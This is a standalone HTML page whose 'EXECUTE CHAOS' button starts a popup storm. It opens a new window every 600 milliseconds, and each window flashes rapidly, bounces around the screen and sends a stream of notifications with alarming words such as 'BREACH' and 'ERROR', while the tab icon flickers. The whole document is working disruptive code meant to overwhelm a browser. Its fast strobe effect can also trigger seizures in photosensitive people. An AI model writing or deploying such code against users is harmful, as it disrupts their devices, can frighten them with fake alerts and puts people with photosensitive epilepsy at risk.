<!DOCTYPE html>
<html>
<head>
    <title>MASTER_REPLICATOR</title>
    <link id="icon" rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' fill='white'/></svg>">
    <style>
        body { background: #000; color: #fff; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .ui { border: 2px solid #fff; padding: 50px; text-align: center; box-shadow: 0 0 20px #fff; }
        button { padding: 20px 40px; font-size: 1.5rem; background: #fff; cursor: pointer; font-weight: bold; border: none; }
        button:hover { background: #ff0000; color: #fff; }
    </style>
</head>
<body>
    <div class="ui">
        <h1>SYSTEM_READY</h1>
        <button onclick="ignite()">EXECUTE CHAOS</button>
    </div>

    <script>
        function ignite() {
            // 1. Icon Glitch (Starts flickering immediately)
            setInterval(() => {
                const p = () => Math.floor(Math.random() * 100);
                document.getElementById('icon').href = `data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><polygon points='${p()},${p()} ${p()},${p()} ${p()},${p()}' fill='white'/></svg>`;
            }, 50);

            // 2. The Spawner (Opens windows at random positions + Bouncing)
            setInterval(() => {
                const w = 400, h = 400;
                const x = Math.floor(Math.random() * (window.screen.availWidth - w));
                const y = Math.floor(Math.random() * (window.screen.availHeight - h));
                
                // Open a blank window
                const win = window.open("", "_blank", `width=${w},height=${h},left=${x},top=${y}`);
                
                if (win) {
                    // This creates the 'notifacation' page INSIDE the new window instantly
                    win.document.write(`
                        <html>
                        <head>
                            <title>GLITCH_UNIT</title>
                            <style>
                                body { background: #000; margin: 0; overflow: hidden; animation: g 0.05s infinite; }
                                @keyframes g { 0% {background:#fff} 50% {background:#000} 100% {background:#888} }
                            </style>
                        </head>
                        <body>
                            <script>
                                // BOUNCING LOGIC
                                let dx = 15, dy = 15;
                                let posX = ${x}, posY = ${y};
                                setInterval(() => {
                                    posX += dx; posY += dy;
                                    if (posX + 400 > screen.availWidth || posX < 0) dx = -dx;
                                    if (posY + 400 > screen.availHeight || posY < 0) dy = -dy;
                                    window.moveTo(posX, posY);
                                }, 30);

                                // NOTIFICATION SPAM
                                Notification.requestPermission().then(p => {
                                    if (p === 'granted') {
                                        const words = ["VOID", "ERROR", "NULL", "BREACH", "LOST"];
                                        setInterval(() => {
                                            let m = ""; for(let i=0; i<5; i++) m += words[Math.floor(Math.random()*words.length)] + " ";
                                            new Notification("!", { body: m.trim(), silent: true });
                                        }, 1000);
                                    }
                                });
                            <\/script>
                        </body>
                        </html>
                    `);
                }
            }, 600);
        }
    </script>
</body>
</html>
